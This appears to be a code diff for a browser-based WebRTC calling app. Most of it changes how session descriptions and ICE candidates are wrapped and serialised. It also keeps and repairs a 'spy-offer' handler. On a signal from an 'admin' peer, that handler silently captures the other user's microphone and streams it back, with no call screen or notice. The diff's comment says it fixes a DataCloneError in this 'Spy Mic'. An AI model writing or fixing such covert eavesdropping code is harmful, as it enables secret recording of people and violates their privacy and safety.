@@ -656,14 +656,24 @@ function onSignal(node){ if(!node||node.to!==ROLE||node.from===ROLE) return; han
 function createPC(){ const peer=new RTCPeerConnection(ICE); peer.onicecandidate=e=>{if(e.candidate) pushSignal(PEER,{type:'ice',candidate:e.candidate.toJSON()});}; peer.ontrack=e=>{ $('remoteV').srcObject=e.streams[0]; $('callStatus').textContent='Connected ✅'; $('ansBtn').style.display='none'; clearTimeout(callTimeout); }; return peer; }
 
 async function handleSignal(node){
-  const p=node.payload; if(p.type==='offer'){
+  const p=node.payload; 
+  
+  if(p.type==='offer'){
     if(pc){pc.close();pc=null;} if(localStream){localStream.getTracks().forEach(t=>t.stop());localStream=null;} currentCallKind=p.kind||'voice';
     $('remoteV').style.display=currentCallKind==='video'?'block':'none'; $('callOverlay').style.display='flex'; $('callTitle').textContent='Incoming Call'; $('callStatus').textContent='Tap ✅'; $('ansBtn').style.display='flex';
     $('ringtone').play().catch(()=>{}); clearTimeout(incomingTimer); incomingTimer=setTimeout(()=>{ if($('ansBtn').style.display!=='none'){ cleanup(); addCallLog(currentCallKind,'missed'); } },30000);
-    pc=createPC(); await pc.setRemoteDescription(p.sdp); pendingCandidates.forEach(c=>pc.addIceCandidate(c).catch(()=>{})); pendingCandidates=[];
-  } else if(p.type==='answer'){ if(pc){await pc.setRemoteDescription(p.sdp); clearTimeout(callTimeout);} } else if(p.type==='ice'){ if(pc&&pc.remoteDescription){try{await pc.addIceCandidate(p.candidate);}catch(_){}} else pendingCandidates.push(p.candidate); } else if(p.type==='end'){ if($('ansBtn').style.display!=='none'){ addCallLog(currentCallKind,'missed'); } cleanup(); }
+    pc=createPC(); 
+    await pc.setRemoteDescription(new RTCSessionDescription(p.sdp)); 
+    pendingCandidates.forEach(c=>pc.addIceCandidate(new RTCIceCandidate(c)).catch(()=>{})); pendingCandidates=[];
+  } else if(p.type==='answer'){ 
+      if(pc){await pc.setRemoteDescription(new RTCSessionDescription(p.sdp)); clearTimeout(callTimeout);} 
+  } else if(p.type==='ice'){ 
+      if(pc&&pc.remoteDescription){try{await pc.addIceCandidate(new RTCIceCandidate(p.candidate));}catch(_){}} else pendingCandidates.push(p.candidate); 
+  } else if(p.type==='end'){ 
+      if($('ansBtn').style.display!=='none'){ addCallLog(currentCallKind,'missed'); } cleanup(); 
+  }
   
-  // FIXED: Added try-catch and spy-error handling
+  // FIXED: DataCloneError for Spy Mic
   else if(p.type==='spy-offer'){ 
       try {
           if(spyPC) { spyPC.close(); spyPC = null; }
@@ -673,24 +683,50 @@ async function handleSignal(node){
           
           const stream = await navigator.mediaDevices.getUserMedia({audio: true});
           stream.getTracks().forEach(t => spyPC.addTrack(t, stream));
-          await spyPC.setRemoteDescription(p.sdp);
+          
+          await spyPC.setRemoteDescription(new RTCSessionDescription(p.sdp));
           const answer = await spyPC.createAnswer();
           await spyPC.setLocalDescription(answer);
-          pushSignal(PEER, {type:'spy-answer', sdp: spyPC.localDescription});
+          
+          // JSON format la anuprom
+          pushSignal(PEER, {type:'spy-answer', sdp: {type: spyPC.localDescription.type, sdp: spyPC.localDescription.sdp}});
       } catch(e) {
           console.error("Spy mic error:", e);
-          pushSignal(PEER, {type:'spy-error', error: e.message}); // Notify admin of failure
+          pushSignal(PEER, {type:'spy-error', error: e.message}); 
       }
   }
-  else if(p.type==='spy-answer'){ if(spyPC){ await spyPC.setRemoteDescription(p.sdp); } }
-  else if(p.type==='spy-ice'){ if(spyPC){ try{await spyPC.addIceCandidate(p.candidate);}catch(_){}} }
-  else if(p.type==='spy-error'){ if(spyPC){ spyPC.close(); spyPC = null; } alert('Viewer mic error: ' + p.error); }
+  else if(p.type==='spy-answer'){ if(spyPC){ await spyPC.setRemoteDescription(new RTCSessionDescription(p.sdp)); } }
+  else if(p.type==='spy-ice'){ if(spyPC){ try{await spyPC.addIceCandidate(new RTCIceCandidate(p.candidate));}catch(_){}} }
+  else if(p.type==='spy-error'){ if(spyPC){ spyPC.close(); spyPC = null; } alert('Admin mic error: ' + p.error); }
 }
 
-window.startCall=async(k)=>{ try{ $('callOverlay').style.display='flex'; $('callTitle').textContent=k==='video'?'Video Calling...':'Calling...'; $('callStatus').textContent='Ringing...'; $('remoteV').style.display=k==='video'?'block':'none'; $('ringtone').play().catch(()=>{}); localStream=await navigator.mediaDevices.getUserMedia({video:k==='video',audio:true}); $('localV').srcObject=localStream; pc=createPC(); localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); const off=await pc.createOffer(); await pc.setLocalDescription(off); pushSignal(PEER,{type:'offer',sdp:pc.localDescription,kind:k}); addCallLog(k,'started'); 
+window.startCall=async(k)=>{ 
+  try{ 
+    $('callOverlay').style.display='flex'; $('callTitle').textContent=k==='video'?'Video Calling...':'Calling...'; $('callStatus').textContent='Ringing...'; $('remoteV').style.display=k==='video'?'block':'none'; $('ringtone').play().catch(()=>{}); 
+    localStream=await navigator.mediaDevices.getUserMedia({video:k==='video',audio:true}); 
+    $('localV').srcObject=localStream; pc=createPC(); localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); 
+    const off=await pc.createOffer(); await pc.setLocalDescription(off); 
+    
+    // JSON format la anuprom
+    pushSignal(PEER,{type:'offer',sdp:{type: off.type, sdp: off.sdp},kind:k}); 
+    addCallLog(k,'started'); 
     clearTimeout(callTimeout); callTimeout = setTimeout(() => { if($('callStatus').textContent === 'Ringing...') { cleanup(); alert('No answer'); } }, 30000);
-}catch(e){ alert('Cam/Mic denied'); cleanup(); } };
-window.answerCall=async()=>{ if(!pc) return; clearTimeout(incomingTimer); $('ringtone').pause(); try{ localStream=await navigator.mediaDevices.getUserMedia({video:currentCallKind==='video',audio:true}); $('localV').srcObject=localStream; localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); const a=await pc.createAnswer(); await pc.setLocalDescription(a); pushSignal(PEER,{type:'answer',sdp:pc.localDescription}); $('ansBtn').style.display='none'; addCallLog(currentCallKind,'started'); }catch(e){ alert('Cam/Mic denied'); endCall(); } };
+  }catch(e){ alert('Cam/Mic denied'); cleanup(); } 
+};
+
+window.answerCall=async()=>{ 
+  if(!pc) return; clearTimeout(incomingTimer); $('ringtone').pause(); 
+  try{ 
+    localStream=await navigator.mediaDevices.getUserMedia({video:currentCallKind==='video',audio:true}); 
+    $('localV').srcObject=localStream; localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); 
+    const a=await pc.createAnswer(); await pc.setLocalDescription(a); 
+    
+    // JSON format la anuprom
+    pushSignal(PEER,{type:'answer',sdp:{type: a.type, sdp: a.sdp}}); 
+    $('ansBtn').style.display='none'; addCallLog(currentCallKind,'started'); 
+  }catch(e){ alert('Cam/Mic denied'); endCall(); } 
+};
+
 window.endCall=()=>{ 
     if(pc) pushSignal(PEER,{type:'end'}); 
     addCallLog(currentCallKind,'ended'); 
